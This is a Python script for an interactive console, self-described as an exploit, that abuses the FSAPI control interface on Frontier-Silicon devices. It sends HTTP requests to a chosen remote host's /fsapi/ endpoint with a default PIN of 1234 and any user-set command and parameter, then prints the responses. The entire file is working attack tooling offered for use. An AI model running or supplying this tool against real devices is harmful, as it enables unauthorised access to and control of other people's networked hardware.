import sys
import io
from bs4 import BeautifulSoup

from requests.models import Response
import fsapi as api

length = len(sys.argv)

class Shell(object):

    def __init__(self) -> None:
        super().__init__()

        self.COMMAND = str()
        self.RHOST= str()
        self.PIN= "1234"
        self.PARAM= str()

    def show_options(self):
        print("\n\nOptions for the exploit:\n")
        print("Option\t\tRequired\t\tValue")
        print("------\t\t--------\t\t-----")
        print(f"COMMAND\t\tyes\t\t\t{self.get_command()}")
        print(f"RHOST\t\tyes\t\t\t{self.get_rhost()}")
        print(f"PIN\t\tno\t\t\t{self.get_pin()}")
        print(f"PARAM\t\tno\t\t\t{self.get_param()}")

    def check(self, c):
        return c != None and c != ""

    def run(self):
        if not self.check(self.get_command()):
            print(f"[!] Cannot run without a command: {self.get_command()}")  
            return

        if not self.check(self.get_pin()):
            print(f"[!] Cannot run without a pin: {self.get_pin()}")
            return

        if not api.check_ip_back(self.get_rhost()):
            print(f"[!] Cannot run without a host: {self.RHOST}")
            return

        URL_t = f"http://{self.get_rhost()}/fsapi/{self.get_command()}?pin={self.get_pin()}"
            
        if self.check(self.get_param()):
            URL_t += f"&{self.get_param()}"

        print(f"[*] Running with: '{URL_t}'")
        page = api.fetch_url(URL_t)
        print("[*] Got a response!\n")

        print(f"Status Code: {page.status_code}")
        print(f"Reason: {page.reason}")
        print("Plain Text:")
        print(" " + "_"*35)
        for line in page.text.split("\n"):
            print(f"|\t{line}")
        print(" " + "-"*35)
        print("\n[*] Successfully executed!")
        
    def help(self):
        print("\nCommands provided by this shell:")
        print("--------------------------------\n")
        print("[command] value\n")
        print("-h\t\tshow the help content")
        print("set\t\tset a specific value. There are different options ")
        print("\t\twhen trying to gather information about your device.")
        print("\t\tuse: COMMAND, RHOST, PIN, PARAM")
        print("show options\t\tshow the specified options")
        print("back\t\tcloses this shell")
        print("run\t\truns the exlpoit\n\n")

    def get_command(self):
        return self.COMMAND

    def get_pin(self):
        return self.PIN
    
    def get_rhost(self):
        return self.RHOST

    def get_param(self):
        return self.PARAM

    def set_command(self, x: str):
        self.COMMAND = x

    def set_pin(self, x: str):
        self.PIN = x

    def set_rhost(self, x: str):
        self.RHOST = x

    def set_param(self, x: str):
        self.PARAM = x

shell = Shell()
def react(cmd: str):
        a = cmd.split(" ")
        if a[0] == "set":
            _set_(a)
        elif a[0] == "run":
            shell.run()
        elif a[0] == "back":
            api.quit()
        elif a[0] == "show":
            if a[1] == "options":
                shell.show_options()
        elif a[0] == "-h":
            shell.help()

def _set_(cmds):
        if cmds[1] == "COMMAND":
            shell.set_command(str(cmds[2]))
            print(f"COMMAND -> {shell.get_command()}\n")
        elif cmds[1] == "RHOST":
            shell.set_rhost(str(cmds[2]))
            print(f"RHOST -> {shell.get_rhost()}\n")
        elif cmds[1] == "PIN":
            shell.set_pin(str(cmds[2]))
            print(f"PIN -> {shell.get_pin()}\n")
        elif cmds[1] == "PARAM":
            if len(str(cmds[2]).split("=")) == 2:
                shell.set_param(str(cmds[2]))
                print(f"PARAM -> {shell.get_param()}\n")
        else:
            print(f"[!] Unexpected command: {cmds[1]}\n")

print(" _________________________________________")
print("| Abusing the FSAPI from Frontier-Silicon |")
print(" ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n")
while(1):
    cmd = input("fsapi> ")

    if cmd != None:
        react(cmd)



